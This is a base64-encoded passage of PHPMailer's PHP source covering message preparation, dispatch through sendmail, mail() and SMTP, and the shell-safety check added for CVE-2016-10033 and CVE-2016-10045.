G1haWxlckV4Y2VwdGlvbiAkZXhjKSB7CiAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyID0gJyc7CiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93ICRleGM7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgIH0KCiAgICAvKioKICAgICAqIFByZXBhcmUgYSBtZXNzYWdlIGZvciBzZW5kaW5nLgogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24KICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gcHJlU2VuZCgpCiAgICB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJHRoaXMtPmVycm9yX2NvdW50ID0gMDsgLy8gUmVzZXQgZXJyb3JzCiAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyID0gJyc7CgogICAgICAgICAgICAvLyBEZXF1ZXVlIHJlY2lwaWVudCBhbmQgUmVwbHktVG8gYWRkcmVzc2VzIHdpdGggSUROCiAgICAgICAgICAgIGZvcmVhY2ggKGFycmF5X21lcmdlKCR0aGlzLT5SZWNpcGllbnRzUXVldWUsICR0aGlzLT5SZXBseVRvUXVldWUpIGFzICRwYXJhbXMpIHsKICAgICAgICAgICAgICAgICRwYXJhbXNbMV0gPSAkdGhpcy0+cHVueWVuY29kZUFkZHJlc3MoJHBhcmFtc1sxXSk7CiAgICAgICAgICAgICAgICBjYWxsX3VzZXJfZnVuY19hcnJheShhcnJheSgkdGhpcywgJ2FkZEFuQWRkcmVzcycpLCAkcGFyYW1zKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoKGNvdW50KCR0aGlzLT50bykgKyBjb3VudCgkdGhpcy0+Y2MpICsgY291bnQoJHRoaXMtPmJjYykpIDwgMSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygncHJvdmlkZV9hZGRyZXNzJyksIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgICAgICB9CgogICAgICAgICAgICAvLyBWYWxpZGF0ZSBGcm9tLCBTZW5kZXIsIGFuZCBDb25maXJtUmVhZGluZ1RvIGFkZHJlc3NlcwogICAgICAgICAgICBmb3JlYWNoIChhcnJheSgnRnJvbScsICdTZW5kZXInLCAnQ29uZmlybVJlYWRpbmdUbycpIGFzICRhZGRyZXNzX2tpbmQpIHsKICAgICAgICAgICAgICAgICR0aGlzLT4kYWRkcmVzc19raW5kID0gdHJpbSgkdGhpcy0+JGFkZHJlc3Nfa2luZCk7CiAgICAgICAgICAgICAgICBpZiAoZW1wdHkoJHRoaXMtPiRhZGRyZXNzX2tpbmQpKSB7CiAgICAgICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkdGhpcy0+JGFkZHJlc3Nfa2luZCA9ICR0aGlzLT5wdW55ZW5jb2RlQWRkcmVzcygkdGhpcy0+JGFkZHJlc3Nfa2luZCk7CiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJHRoaXMtPiRhZGRyZXNzX2tpbmQpKSB7CiAgICAgICAgICAgICAgICAgICAgJGVycm9yX21lc3NhZ2UgPSAkdGhpcy0+bGFuZygnaW52YWxpZF9hZGRyZXNzJykgLiAnIChwdW55RW5jb2RlKSAnIC4gJHRoaXMtPiRhZGRyZXNzX2tpbmQ7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsKICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkZXJyb3JfbWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy8gU2V0IHdoZXRoZXIgdGhlIG1lc3NhZ2UgaXMgbXVsdGlwYXJ0L2FsdGVybmF0aXZlCiAgICAgICAgICAgIGlmICgkdGhpcy0+YWx0ZXJuYXRpdmVFeGlzdHMoKSkgewogICAgICAgICAgICAgICAgJHRoaXMtPkNvbnRlbnRUeXBlID0gJ211bHRpcGFydC9hbHRlcm5hdGl2ZSc7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICR0aGlzLT5zZXRNZXNzYWdlVHlwZSgpOwogICAgICAgICAgICAvLyBSZWZ1c2UgdG8gc2VuZCBhbiBlbXB0eSBtZXNzYWdlIHVubGVzcyB3ZSBhcmUgc3BlY2lmaWNhbGx5IGFsbG93aW5nIGl0CiAgICAgICAgICAgIGlmICghJHRoaXMtPkFsbG93RW1wdHkgYW5kIGVtcHR5KCR0aGlzLT5Cb2R5KSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZW1wdHlfbWVzc2FnZScpLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy8gQ3JlYXRlIGJvZHkgYmVmb3JlIGhlYWRlcnMgaW4gY2FzZSBib2R5IG1ha2VzIGNoYW5nZXMgdG8gaGVhZGVycyAoZS5nLiBhbHRlcmluZyB0cmFuc2ZlciBlbmNvZGluZykKICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgPSAnJzsKICAgICAgICAgICAgJHRoaXMtPk1JTUVCb2R5ID0gJHRoaXMtPmNyZWF0ZUJvZHkoKTsKICAgICAgICAgICAgLy8gY3JlYXRlQm9keSBtYXkgaGF2ZSBhZGRlZCBzb21lIGhlYWRlcnMsIHNvIHJldGFpbiB0aGVtCiAgICAgICAgICAgICR0ZW1waGVhZGVycyA9ICR0aGlzLT5NSU1FSGVhZGVyOwogICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciA9ICR0aGlzLT5jcmVhdGVIZWFkZXIoKTsKICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgLj0gJHRlbXBoZWFkZXJzOwoKICAgICAgICAgICAgLy8gVG8gY2FwdHVyZSB0aGUgY29tcGxldGUgbWVzc2FnZSB3aGVuIHVzaW5nIG1haWwoKSwgY3JlYXRlCiAgICAgICAgICAgIC8vIGFuIGV4dHJhIGhlYWRlciBsaXN0IHdoaWNoIGNyZWF0ZUhlYWRlcigpIGRvZXNuJ3QgZm9sZCBpbgogICAgICAgICAgICBpZiAoJHRoaXMtPk1haWxlciA9PSAnbWFpbCcpIHsKICAgICAgICAgICAgICAgIGlmIChjb3VudCgkdGhpcy0+dG8pID4gMCkgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyIC49ICR0aGlzLT5hZGRyQXBwZW5kKCdUbycsICR0aGlzLT50byk7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyIC49ICR0aGlzLT5oZWFkZXJMaW5lKCdUbycsICd1bmRpc2Nsb3NlZC1yZWNpcGllbnRzOjsnKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyIC49ICR0aGlzLT5oZWFkZXJMaW5lKAogICAgICAgICAgICAgICAgICAgICdTdWJqZWN0JywKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZW5jb2RlSGVhZGVyKCR0aGlzLT5zZWN1cmVIZWFkZXIodHJpbSgkdGhpcy0+U3ViamVjdCkpKQogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgLy8gU2lnbiB3aXRoIERLSU0gaWYgZW5hYmxlZAogICAgICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5ES0lNX2RvbWFpbikKICAgICAgICAgICAgICAgIGFuZCAhZW1wdHkoJHRoaXMtPkRLSU1fc2VsZWN0b3IpCiAgICAgICAgICAgICAgICBhbmQgKCFlbXB0eSgkdGhpcy0+REtJTV9wcml2YXRlX3N0cmluZykKICAgICAgICAgICAgICAgICAgICBvciAoIWVtcHR5KCR0aGlzLT5ES0lNX3ByaXZhdGUpCiAgICAgICAgICAgICAgICAgICAgICAgIGFuZCBzZWxmOjppc1Blcm1pdHRlZFBhdGgoJHRoaXMtPkRLSU1fcHJpdmF0ZSkKICAgICAgICAgICAgICAgICAgICAgICAgYW5kIGZpbGVfZXhpc3RzKCR0aGlzLT5ES0lNX3ByaXZhdGUpCiAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgKQogICAgICAgICAgICApIHsKICAgICAgICAgICAgICAgICRoZWFkZXJfZGtpbSA9ICR0aGlzLT5ES0lNX0FkZCgKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciAuICR0aGlzLT5tYWlsSGVhZGVyLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkdGhpcy0+U3ViamVjdCkpLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5NSU1FQm9keQogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICR0aGlzLT5NSU1FSGVhZGVyID0gcnRyaW0oJHRoaXMtPk1JTUVIZWFkZXIsICJcclxuICIpIC4gc2VsZjo6Q1JMRiAuCiAgICAgICAgICAgICAgICAgICAgc3RyX3JlcGxhY2UoIlxyXG4iLCAiXG4iLCAkaGVhZGVyX2RraW0pIC4gc2VsZjo6Q1JMRjsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICB9IGNhdGNoIChwaHBtYWlsZXJFeGNlcHRpb24gJGV4YykgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7CiAgICAgICAgICAgICAgICB0aHJvdyAkZXhjOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBBY3R1YWxseSBzZW5kIGEgbWVzc2FnZS4KICAgICAqIFNlbmQgdGhlIGVtYWlsIHZpYSB0aGUgc2VsZWN0ZWQgbWVjaGFuaXNtCiAgICAgKiBAdGhyb3dzIHBocG1haWxlckV4Y2VwdGlvbgogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBwb3N0U2VuZCgpCiAgICB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgLy8gQ2hvb3NlIHRoZSBtYWlsZXIgYW5kIHNlbmQgdGhyb3VnaCBpdAogICAgICAgICAgICBzd2l0Y2ggKCR0aGlzLT5NYWlsZXIpIHsKICAgICAgICAgICAgICAgIGNhc2UgJ3NlbmRtYWlsJzoKICAgICAgICAgICAgICAgIGNhc2UgJ3FtYWlsJzoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRtYWlsU2VuZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsKICAgICAgICAgICAgICAgIGNhc2UgJ3NtdHAnOgogICAgICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+c210cFNlbmQoJHRoaXMtPk1JTUVIZWFkZXIsICR0aGlzLT5NSU1FQm9keSk7CiAgICAgICAgICAgICAgICBjYXNlICdtYWlsJzoKICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPm1haWxTZW5kKCR0aGlzLT5NSU1FSGVhZGVyLCAkdGhpcy0+TUlNRUJvZHkpOwogICAgICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgICAgICAkc2VuZE1ldGhvZCA9ICR0aGlzLT5NYWlsZXIuJ1NlbmQnOwogICAgICAgICAgICAgICAgICAgIGlmIChtZXRob2RfZXhpc3RzKCR0aGlzLCAkc2VuZE1ldGhvZCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT4kc2VuZE1ldGhvZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+bWFpbFNlbmQoJHRoaXMtPk1JTUVIZWFkZXIsICR0aGlzLT5NSU1FQm9keSk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIChwaHBtYWlsZXJFeGNlcHRpb24gJGV4YykgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGV4Yy0+Z2V0TWVzc2FnZSgpKTsKICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXhjLT5nZXRNZXNzYWdlKCkpOwogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsKICAgICAgICAgICAgICAgIHRocm93ICRleGM7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBtYWlsIHVzaW5nIHRoZSAkU2VuZG1haWwgcHJvZ3JhbS4KICAgICAqIEBwYXJhbSBzdHJpbmcgJGhlYWRlciBUaGUgbWVzc2FnZSBoZWFkZXJzCiAgICAgKiBAcGFyYW0gc3RyaW5nICRib2R5IFRoZSBtZXNzYWdlIGJvZHkKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokU2VuZG1haWwKICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZW5kbWFpbFNlbmQoJGhlYWRlciwgJGJvZHkpCiAgICB7CiAgICAgICAgLy8gQ1ZFLTIwMTYtMTAwMzMsIENWRS0yMDE2LTEwMDQ1OiBEb24ndCBwYXNzIC1mIGlmIGNoYXJhY3RlcnMgd2lsbCBiZSBlc2NhcGVkLgogICAgICAgIGlmICghZW1wdHkoJHRoaXMtPlNlbmRlcikgYW5kIHNlbGY6OmlzU2hlbGxTYWZlKCR0aGlzLT5TZW5kZXIpKSB7CiAgICAgICAgICAgIGlmICgkdGhpcy0+TWFpbGVyID09ICdxbWFpbCcpIHsKICAgICAgICAgICAgICAgICRzZW5kbWFpbEZtdCA9ICclcyAtZiVzJzsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRzZW5kbWFpbEZtdCA9ICclcyAtb2kgLWYlcyAtdCc7CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAoJHRoaXMtPk1haWxlciA9PSAncW1haWwnKSB7CiAgICAgICAgICAgICAgICAkc2VuZG1haWxGbXQgPSAnJXMnOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJHNlbmRtYWlsRm10ID0gJyVzIC1vaSAtdCc7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIC8vIFRPRE86IElmIHBvc3NpYmxlLCB0aGlzIHNob3VsZCBiZSBjaGFuZ2VkIHRvIGVzY2FwZXNoZWxsYXJnLiAgTmVlZHMgdGhvcm91Z2ggdGVzdGluZy4KICAgICAgICAkc2VuZG1haWwgPSBzcHJpbnRmKCRzZW5kbWFpbEZtdCwgZXNjYXBlc2hlbGxjbWQoJHRoaXMtPlNlbmRtYWlsKSwgJHRoaXMtPlNlbmRlcik7CgogICAgICAgIGlmICgkdGhpcy0+U2luZ2xlVG8pIHsKICAgICAgICAgICAgZm9yZWFjaCAoJHRoaXMtPlNpbmdsZVRvQXJyYXkgYXMgJHRvQWRkcikgewogICAgICAgICAgICAgICAgaWYgKCFAJG1haWwgPSBwb3Blbigkc2VuZG1haWwsICd3JykpIHsKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleGVjdXRlJykgLiAkdGhpcy0+U2VuZG1haWwsIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZnB1dHMoJG1haWwsICdUbzogJyAuICR0b0FkZHIgLiAiXG4iKTsKICAgICAgICAgICAgICAgIGZwdXRzKCRtYWlsLCAkaGVhZGVyKTsKICAgICAgICAgICAgICAgIGZwdXRzKCRtYWlsLCAkYm9keSk7CiAgICAgICAgICAgICAgICAkcmVzdWx0ID0gcGNsb3NlKCRtYWlsKTsKICAgICAgICAgICAgICAgICR0aGlzLT5kb0NhbGxiYWNrKAogICAgICAgICAgICAgICAgICAgICgkcmVzdWx0ID09IDApLAogICAgICAgICAgICAgICAgICAgIGFycmF5KCR0b0FkZHIpLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5jYywKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+YmNjLAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5TdWJqZWN0LAogICAgICAgICAgICAgICAgICAgICRib2R5LAogICAgICAgICAgICAgICAgICAgICR0aGlzLT5Gcm9tCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgaWYgKCRyZXN1bHQgIT0gMCkgewogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4ZWN1dGUnKSAuICR0aGlzLT5TZW5kbWFpbCwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBpZiAoIUAkbWFpbCA9IHBvcGVuKCRzZW5kbWFpbCwgJ3cnKSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXhlY3V0ZScpIC4gJHRoaXMtPlNlbmRtYWlsLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBmcHV0cygkbWFpbCwgJGhlYWRlcik7CiAgICAgICAgICAgIGZwdXRzKCRtYWlsLCAkYm9keSk7CiAgICAgICAgICAgICRyZXN1bHQgPSBwY2xvc2UoJG1haWwpOwogICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygKICAgICAgICAgICAgICAgICgkcmVzdWx0ID09IDApLAogICAgICAgICAgICAgICAgJHRoaXMtPnRvLAogICAgICAgICAgICAgICAgJHRoaXMtPmNjLAogICAgICAgICAgICAgICAgJHRoaXMtPmJjYywKICAgICAgICAgICAgICAgICR0aGlzLT5TdWJqZWN0LAogICAgICAgICAgICAgICAgJGJvZHksCiAgICAgICAgICAgICAgICAkdGhpcy0+RnJvbQogICAgICAgICAgICApOwogICAgICAgICAgICBpZiAoJHJlc3VsdCAhPSAwKSB7CiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleGVjdXRlJykgLiAkdGhpcy0+U2VuZG1haWwsIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiB0cnVlOwogICAgfQoKICAgIC8qKgogICAgICogRml4IENWRS0yMDE2LTEwMDMzIGFuZCBDVkUtMjAxNi0xMDA0NSBieSBkaXNhbGxvd2luZyBwb3RlbnRpYWxseSB1bnNhZmUgc2hlbGwgY2hhcmFjdGVycy4KICAgICAqCiAgICAgKiBOb3RlIHRoYXQgZXNjYXBlc2hlbGxhcmcgYW5kIGVzY2FwZXNoZWxsY21kIGFyZSBpbmFkZXF1YXRlIGZvciBvdXIgcHVycG9zZXMsIGVzcGVjaWFsbHkgb24gV2luZG93cy4KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cmluZyBUaGUgc3RyaW5nIHRvIGJlIHZhbGlkYXRlZAogICAgICogQHNlZSBodHRwczovL2dpdGh1Yi5jb20vUEhQTWFpbGVyL1BIUE1haWxlci9pc3N1ZXMvOTI0IENWRS0yMDE2LTEwMDQ1IGJ1ZyByZXBvcnQKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHJvdGVjdGVkIHN0YXRpYyBmdW5jdGlvbiBpc1NoZWxsU2FmZSgkc3RyaW5nKQogICAgewogICAgICAgIC8vIEZ1dHVyZS1wcm9vZgogICAgICAgIGlmIChlc2NhcGVzaGVsbGNtZCgkc3RyaW5nKSAhPT0gJHN0cmluZwogICAgICAgICAgICBvciAhaW5fYXJyYXkoZXNjYXBlc2hlbGxhcmcoJHN0cmluZyksIGFycmF5KCInJHN0cmluZyciLCAiXCIkc3RyaW5nXCIiKSkKICAgICAgICApIHsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KCiAgICAgICAgJGxlbmd0aCA9IHN0cmxlbigkc3RyaW5nKTsKCiAgICAgICAgZm9yICgkaSA9IDA7ICRpIDwgJGxlbmd0aDsgJGkrKykgewogICAgICAgICAgICAkYyA9ICRzdHJpbmdbJGldOwoKICAgICAgICAgICAgLy8gQWxsIG90aGVyIGNoYXJhY3RlcnMgaGF2ZSBhIHNwZWNpYWwgbWVhbmluZyBpbiBhdCBsZWFzdCBvbmUgY29tbW9uIHNoZWxsLCBpbmNsdWRpbmcgPSBhbmQgKy4KICAgICAgICAgICAgLy8gRnVsbCBzdG9wICguKSBoYXMgYSBzcGVjaWFsIG1lYW5pbmcgaW4gY21kLmV4ZSwgYnV0IGl0cyBpbXBhY3Qgc2hvdWxkIGJlIG5lZ2xpZ2libGUgaGVyZS4KICAgICAgICAgICAgLy8gTm90ZSB0aGF0IHRoaXMgZG9lcyBwZXJtaXQgbm9uLUxhdGluIGFscGhhbnVtZXJpYyBjaGFyYWN0ZXJzIGJhc2VkIG9uIHRoZSBjdXJyZW50IGxvY2FsZS4KICAgICAgICAgICAgaWYgKCFjdHlwZV9hbG51bSgkYykgJiYgc3RycG9zKCdAXy0uJywgJGMpID09PSBmYWxzZSkgewogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH0KCiAgICAvKioKICAgICAqIENoZWNrIHdoZXRoZXIgYSBmaWxlIHBhdGggaXMgb2YgYSBwZXJtaXR0ZWQgdHlwZS4KICAgICAqIFVzZWQgdG8gcmVqZWN0IFVSTHMgYW5kIHBoYXIgZmlsZXMgZnJvbSBmdW5jdGlvbnMgdGhhdCBhY2Nlc3MgbG9jYWwgZmlsZSBwYXRocywKICAgICAqIHN1Y2ggYXMgYWRkQXR0YWNobWVudC4KICAgICAqIEBwYXJhbSBzdHJpbmcgJHBhdGggQSByZWxhdGl2ZSBvciBhYnNvbHV0ZSBwYXRoIHRvIGEgZmlsZS4KICAgICAqIEByZXR1cm4gYm9vbAogICAgICovCiAgICBwcm90ZWN0ZWQgc3RhdGljIGZ1bmN0aW9uIGlzUGVybWl0dGVkUGF0aCgkcGF0aCkKICAgIHsKICAgICAgICByZXR1cm4gIXByZWdfbWF0Y2goJyNeW2Etel0rOi8vI2knLCAkcGF0aCk7CiAgICB9CgogICAgLyoqCiAgICAgKiBTZW5kIG1haWwgdXNpbmcgdGhlIFBIUCBtYWlsKCkgZnVuY3Rpb24uCiAgICAgKiBAcGFyYW0gc3RyaW5nICRoZWFkZXIgVGhlIG1lc3NhZ2UgaGVhZGVycwogICAgICogQHBhcmFtIHN0cmluZyAkYm9keSBUaGUgbWVzc2FnZSBib2R5CiAgICAgKiBAbGluayBodHRwOi8vd3d3LnBocC5uZXQvbWFudWFsL2VuL2Jvb2subWFpbC5waHAKICAgICAqIEB0aHJvd3MgcGhwbWFpbGVyRXhjZXB0aW9uCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZAogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBtYWlsU2VuZCgkaGVhZGVyLCAkYm9keSkKICAgIHsKICAgICAgICAkdG9BcnIgPSBhcnJheSgpOwogICAgICAgIGZvcmVhY2ggKCR0aGlzLT50byBhcyAkdG9hZGRyKSB7CiAgICAgICAgICAgICR0b0FycltdID0gJHRoaXMtPmFkZHJGb3JtYXQoJHRvYWRkcik7CiAgICAgICAgfQogICAgICAgICR0byA9IGltcGxvZGUoJywgJywgJHRvQXJyKTsKCiAgICAgICAgJHBhcmFtcyA9IG51bGw7CiAgICAgICAgLy9UaGlzIHNldHMgdGhlIFNNVFAgZW52ZWxvcGUgc2VuZGVyIHdoaWNoIGdldHMgdHVybmVkIGludG8gYSByZXR1cm4tcGF0aCBoZWFkZXIgYnkgdGhlIHJlY2VpdmVyCiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+U2VuZGVyKSBhbmQgJHRoaXMtPnZhbGlkYXRlQWRkcmVzcygkdGhpcy0+U2VuZGVyKSkgewogICAgICAgICAgICAvLyBDVkUtMjAxNi0xMDAzMywgQ1ZFLTIwMTYtMTAwNDU6IERvbid0IHBhc3MgLWYgaWYgY2hhcmFjdGVycyB3aWxsIGJlIGVzY2FwZWQuCiAgICAgICAgICAgIGlmIChzZWxmOjppc1NoZWxsU2FmZSgkdGhpcy0+U2VuZGVyKSkgewogICAgICAgICAgICAgICAgJHBhcmFtcyA9IHNwcmludGYoJy1mJXMnLCAkdGhpcy0+U2VuZGVyKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5TZW5kZXIpIGFuZCAhaW5pX2dldCgnc2FmZV9tb2RlJykgYW5kICR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJHRoaXMtPlNlbmRlcikpIHsKICAgICAgICAgICAgJG9sZF9mcm9tID0gaW5pX2dldCgnc2VuZG1haWxfZnJvbScpOwogICAgICAgICAgICBpbmlfc2V0KCdzZW5kbWFpbF9mcm9tJywgJHRoaXMtPlNlbmRlcik7CiAgICAgICAgfQogICAgICAgICRyZXN1bHQgPSBmYWxzZTsKICAgICAgICBpZiAoJHRoaXMtPlNpbmdsZVRvIGFuZCBjb3VudCgkdG9BcnIpID4gMSkgewogICAgICAgICAgICBmb3JlYWNoICgkdG9BcnIgYXMgJHRvQWRkcikgewogICAgICAgICAgICAgICAgJHJlc3VsdCA9ICR0aGlzLT5tYWlsUGFzc3RocnUoJHRvQWRkciwgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkaGVhZGVyLCAkcGFyYW1zKTsKICAgICAgICAgICAgICAgICR0aGlzLT5kb0NhbGxiYWNrKCRyZXN1bHQsIGFycmF5KCR0b0FkZHIpLCAkdGhpcy0+Y2MsICR0aGlzLT5iY2MsICR0aGlzLT5TdWJqZWN0LCAkYm9keSwgJHRoaXMtPkZyb20pOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHJlc3VsdCA9ICR0aGlzLT5tYWlsUGFzc3RocnUoJHRvLCAkdGhpcy0+U3ViamVjdCwgJGJvZHksICRoZWFkZXIsICRwYXJhbXMpOwogICAgICAgICAgICAkdGhpcy0+ZG9DYWxsYmFjaygkcmVzdWx0LCAkdGhpcy0+dG8sICR0aGlzLT5jYywgJHRoaXMtPmJjYywgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkdGhpcy0+RnJvbSk7CiAgICAgICAgfQogICAgICAgIGlmIChpc3NldCgkb2xkX2Zyb20pKSB7CiAgICAgICAgICAgIGluaV9zZXQoJ3NlbmRtYWlsX2Zyb20nLCAkb2xkX2Zyb20pOwogICAgICAgIH0KICAgICAgICBpZiAoISRyZXN1bHQpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnaW5zdGFudGlhdGUnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgfQogICAgICAgIHJldHVybiB0cnVlOwogICAgfQoKICAgIC8qKgogICAgICogR2V0IGFuIGluc3RhbmNlIHRvIHVzZSBmb3IgU01UUCBvcGVyYXRpb25zLgogICAgICogT3ZlcnJpZGUgdGhpcyBmdW5jdGlvbiB0byBsb2FkIHlvdXIgb3duIFNNVFAgaW1wbGVtZW50YXRpb24KICAgICAqIEByZXR1cm4gU01UUAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0U01UUEluc3RhbmNlKCkKICAgIHsKICAgICAgICBpZiAoIWlzX29iamVjdCgkdGhpcy0+c210cCkpIHsKICAgICAgICAgICAgJHRoaXMtPnNtdHAgPSBuZXcgU01UUDsKICAgICAgICB9CiAgICAgICAgcmV0dXJuICR0aGlzLT5zbXRwOwogICAgfQoKICAgIC8qKgogICAgICogU2VuZCBtYWlsIHZpYSBT